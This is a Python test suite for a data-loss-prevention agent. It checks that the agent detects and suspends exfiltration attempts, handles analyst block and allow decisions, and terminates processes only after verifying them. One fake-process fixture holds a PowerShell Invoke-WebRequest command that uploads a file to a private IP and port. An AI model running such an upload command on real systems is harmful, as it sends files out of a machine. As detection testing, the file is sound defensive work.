import subprocess
import sys
from pathlib import Path
from tempfile import TemporaryDirectory
from unittest import TestCase
from unittest.mock import patch

import psutil

from dlp_agent.agent import UsbDlpAgent
from dlp_agent.alerting import AlertResult
from dlp_agent.dashboard import DashboardHandler
from dlp_agent.incident_store import IncidentStore
from dlp_agent.network_monitor import NetworkConnectionEvent, NetworkMonitor
from dlp_agent.policy import PolicyEngine
from dlp_agent.process_enforcer import ProcessActionResult, terminate_process_tree


class FakeProcess:
    def __init__(self, cwd: str) -> None:
        self.pid = 4321
        self.info = {
            "pid": self.pid,
            "name": "powershell.exe",
            "cmdline": [
                "powershell.exe",
                "-Command",
                "Invoke-WebRequest -Uri http://192.168.200.3:6666 -Method Post "
                "-InFile 'synthetic_test_data/a.txt'",
            ],
            "create_time": 12345.0,
        }
        self._cwd = cwd

    def name(self) -> str:
        return str(self.info["name"])

    def cmdline(self) -> list[str]:
        return list(self.info["cmdline"])

    def create_time(self) -> float:
        return float(self.info["create_time"])

    def cwd(self) -> str:
        return self._cwd

    def open_files(self) -> list[object]:
        return []


class FakeAlerter:
    def notify(self, incident: dict[str, object]) -> list[AlertResult]:
        return [AlertResult(sent=True, channel="test")]


class NetworkExfiltrationTests(TestCase):
    def test_detects_powershell_infile_command_before_connection_finishes(self) -> None:
        with TemporaryDirectory() as tmp:
            process = FakeProcess(tmp)
            monitor = NetworkMonitor()
            with (
                patch("dlp_agent.network_monitor.psutil.process_iter", return_value=[process]),
                patch("dlp_agent.network_monitor.psutil.net_connections", return_value=[]),
            ):
                events = list(monitor.poll())

        self.assertEqual(len(events), 1)
        self.assertEqual(events[0].status, "COMMAND_DETECTED")
        self.assertEqual(events[0].extracted_file_name, "a.txt")
        self.assertEqual(events[0].remote_address, "192.168.200.3")
        self.assertEqual(events[0].remote_port, 6666)
        self.assertEqual(events[0].process_create_time, 12345.0)

    def test_sensitive_powershell_transfer_is_suspended_for_soc_review(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            sensitive_file = root / "a.txt"
            sensitive_file.write_text("password=VerySecretPassword123", encoding="utf-8")
            agent = UsbDlpAgent(
                policy_engine=PolicyEngine(),
                incident_store=IncidentStore(root / "incidents.jsonl"),
                alerter=FakeAlerter(),
            )
            event = NetworkConnectionEvent(
                process_name="powershell.exe",
                pid=4321,
                local_address="",
                remote_address="192.168.200.3",
                remote_port=6666,
                status="COMMAND_DETECTED",
                extracted_file_name="a.txt",
                extracted_file_path=str(sensitive_file),
                process_create_time=12345.0,
            )
            suspension = ProcessActionResult(
                True,
                "suspended",
                "powershell.exe (PID 4321) suspended pending SOC decision",
            )
            with patch("dlp_agent.agent.suspend_process", return_value=suspension) as suspend:
                incident = agent.process_network_event(event)

        suspend.assert_called_once_with(4321, "powershell.exe", 12345.0)
        self.assertEqual(incident["policy_decision"], "Alert")
        self.assertEqual(incident["enforcement_state"], "suspended")
        self.assertEqual(incident["file_classification"], "Restricted")
        self.assertEqual(incident["finding_count"], 1)

    def test_dashboard_block_terminates_only_the_recorded_process(self) -> None:
        with TemporaryDirectory() as tmp:
            store = IncidentStore(Path(tmp) / "incidents.jsonl")
            store.append(
                {
                    "incident_id": "INC-POWERSHELL",
                    "incident_type": "network_exfiltration",
                    "device_id": "NETWORK",
                    "process_pid": 4321,
                    "process_name": "powershell.exe",
                    "process_create_time": 12345.0,
                    "enforcement_state": "suspended",
                    "timeline": [],
                }
            )
            handler = object.__new__(DashboardHandler)
            handler.store = store
            handler._json_body = lambda: {"action": "block"}
            handler._serve_json = lambda *args, **kwargs: None
            handler._audit_change = lambda *args, **kwargs: None
            termination = ProcessActionResult(
                True,
                "terminated",
                "powershell.exe (PID 4321) terminated by SOC",
            )
            with patch(
                "dlp_agent.dashboard.terminate_process_tree",
                return_value=termination,
            ) as terminate:
                handler._enforce_incident("INC-POWERSHELL")

            updated = store.get("INC-POWERSHELL")

        terminate.assert_called_once_with(4321, "powershell.exe", 12345.0)
        self.assertEqual(updated["manual_action"], "block")
        self.assertEqual(updated["enforcement_state"], "terminated")
        self.assertEqual(updated["incident_status"], "Resolved")

    def test_dashboard_allow_resumes_a_suspended_process(self) -> None:
        with TemporaryDirectory() as tmp:
            store = IncidentStore(Path(tmp) / "incidents.jsonl")
            store.append(
                {
                    "incident_id": "INC-ALLOW-POWERSHELL",
                    "incident_type": "network_exfiltration",
                    "device_id": "NETWORK",
                    "process_pid": 4321,
                    "process_name": "powershell.exe",
                    "process_create_time": 12345.0,
                    "enforcement_state": "suspended",
                    "timeline": [],
                }
            )
            handler = object.__new__(DashboardHandler)
            handler.store = store
            handler._json_body = lambda: {"action": "allow"}
            handler._serve_json = lambda *args, **kwargs: None
            handler._audit_change = lambda *args, **kwargs: None
            resumed = ProcessActionResult(
                True,
                "resumed",
                "powershell.exe (PID 4321) resumed by SOC",
            )
            with patch(
                "dlp_agent.dashboard.resume_process",
                return_value=resumed,
            ) as resume:
                handler._enforce_incident("INC-ALLOW-POWERSHELL")

            updated = store.get("INC-ALLOW-POWERSHELL")

        resume.assert_called_once_with(4321, "powershell.exe", 12345.0)
        self.assertEqual(updated["manual_action"], "allow")
        self.assertEqual(updated["enforcement_state"], "resumed")
        self.assertEqual(updated["incident_status"], "Closed")

    def test_terminates_a_verified_process(self) -> None:
        child = subprocess.Popen(
            [sys.executable, "-c", "import time; time.sleep(30)"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        try:
            process = psutil.Process(child.pid)
            result = terminate_process_tree(
                child.pid,
                process.name(),
                process.create_time(),
            )
            child.wait(timeout=5)
        finally:
            if child.poll() is None:
                child.kill()
                child.wait(timeout=5)

        self.assertTrue(result.success)
        self.assertEqual(result.state, "terminated")

    def test_refuses_to_terminate_a_reused_process_id(self) -> None:
        child = subprocess.Popen(
            [sys.executable, "-c", "import time; time.sleep(30)"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        try:
            process = psutil.Process(child.pid)
            result = terminate_process_tree(
                child.pid,
                process.name(),
                process.create_time() + 100,
            )
            self.assertIsNone(child.poll())
        finally:
            if child.poll() is None:
                child.kill()
                child.wait(timeout=5)

        self.assertFalse(result.success)
        self.assertEqual(result.state, "terminate_failed")
